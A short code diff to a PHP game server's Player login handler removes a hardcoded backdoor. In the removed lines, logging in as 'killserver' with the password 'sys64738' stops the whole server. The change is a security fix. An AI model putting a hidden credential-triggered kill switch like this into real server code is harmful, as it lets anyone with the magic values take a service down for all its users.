@@ -125,14 +125,6 @@ class Player extends \Server\Server {
 		$username = strtolower($this->inStream->getString());
 		$password = $this->inStream->getString();
 
-		switch($username) {
-			case 'killserver':
-				if($password == 'sys64738') {
-					$this->server->stop();
-				}
-				break;
-		}
-
 		$this->setUsername($username);
 		$this->setPassword($password);
 
